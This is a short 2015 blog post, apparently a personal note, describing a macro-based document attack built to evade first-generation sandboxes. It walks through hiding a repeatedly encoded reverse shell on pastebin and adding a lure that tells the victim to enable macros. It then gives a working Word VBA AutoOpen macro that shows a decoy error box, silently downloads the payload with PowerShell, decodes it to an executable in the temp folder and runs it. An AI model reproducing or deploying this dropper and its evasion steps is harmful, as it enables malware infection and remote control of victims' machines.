---
title: 'Sandbox Evasion & Document Based Attack'
date: 2015-05-21T16:49:00.001+01:00
draft: false
aliases: [ "/2015/05/sandbox-evasion.html" ]
parent: Blogger
---
#### date: 2015-05-21

Note to oneself, msgbox is sufficient to break first generation sandboxes. Thank goodness for second generation sandboxes at the CPU level, how's malware going to evade that?  
  
For the test we do a few things!  
  
First you encode your reverse shell umpteen iterations (avoids AV detection), open it in notepad++ and encode it to base64, copy this text and dump it on pastebin. grab the raw url and put it into a word macro like below.  
  
In the document body add some message to enable macro's to decode the content and add some random base64 garbage.  
  
```
Function myPause()  
Dim pausetime, start, finish  
pausetime = 4  
start = Timer  
Do While Timer < start + pausetime  
DoEvents  
Loop  
finish = Timer  
End Function  
  
Sub AutoOpen()  
MsgBox "Encoding Error, Click OK to continue", vbOKOnly  
Shell "cmd /K PowerShell.exe $wc = New-Object System.Net.WebClient; $wc.UseDefaultCredentials = $true; $wc.Proxy.Credentials = $wc.Credentials; $wc.DownloadFile('http://pastebin.com/raw.php?i=base64content','%TEMP%\\b64e.txt')", vbHide  
myPause  
Shell "cmd /K PowerShell.exe Set-Content -Value (\[System.Convert\]::FromBase64String((get-content '%TEMP%\\b64e.txt'))) -Encoding Byte '%TEMP%\\reallybad.exe'", vbHide  
myPause  
Shell "start %TEMP%\\reallybad.exe;", vbHide  
End Sub  

```